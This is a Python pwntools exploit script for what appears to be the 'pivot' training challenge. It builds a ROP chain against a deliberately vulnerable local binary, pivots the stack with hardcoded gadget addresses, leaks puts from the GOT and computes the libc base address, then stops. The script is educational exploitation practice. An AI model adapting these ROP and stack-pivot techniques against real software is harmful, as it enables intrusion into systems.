from pwn import *

context(arch='amd64', os='linux')
binary_name = 'pivot'
p = process('./'+binary_name)
elf =  ELF(binary_name)
libc_so = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_pivot = ELF("libpivot.so")
rop =  ROP(elf)

# 0x0000000000400b6d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rsp_r13_r14_r15 = 0x400b6d

foothold_function_PLT = elf.plt["foothold_function"]
foothold_function_GOT = elf.got["foothold_function"]
MAIN_PLT = elf.symbols['main']
PUTS_PLT = elf.plt['puts']
puts_GOT = elf.got["puts"]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
received = p.recvuntil("> ")
pivot_address = received.split("pivot: ")[1].split("\n")[0]
pivot_address_hexa = int(pivot_address, 16)

log.info("Pivot address:         "+  str(pivot_address))
log.info("foothold_function plt: " + hex(foothold_function_PLT))
log.info("foothold_function GOT: " + hex(foothold_function_GOT))
log.info("Main start:            " + hex(MAIN_PLT))
log.info("Puts plt:              " + hex(PUTS_PLT))
log.info("puts GOT:              " + hex(puts_GOT))
log.info("pop rdi; ret:          " + hex(pop_rdi))

# puts
rop1  = ""
rop1 += p64(foothold_function_PLT) #+ p64(MAIN_PLT)
rop1 += p64(foothold_function_PLT) + p64(pop_rdi) + p64(puts_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

p.sendline(rop1)
recv = (p.recvline())

# Stack pivot
garbage = 0x61616161
stack_pivot = "A" * 40 + p64(0x400b00) + p64(pivot_address_hexa) + p64(0x000400b02) 
p.sendline(stack_pivot)

recv = p.recvline()
leaked_address = recv.replace("\n","").replace("> ","")[-8:].ljust(8, "\x00")
log.info("leaked_address: %s" % (leaked_address))

# puts
libc_so.address = u64(leaked_address) - libc_so.symbols["puts"]
log.info("libc base @ %s" % hex(libc_so.address))
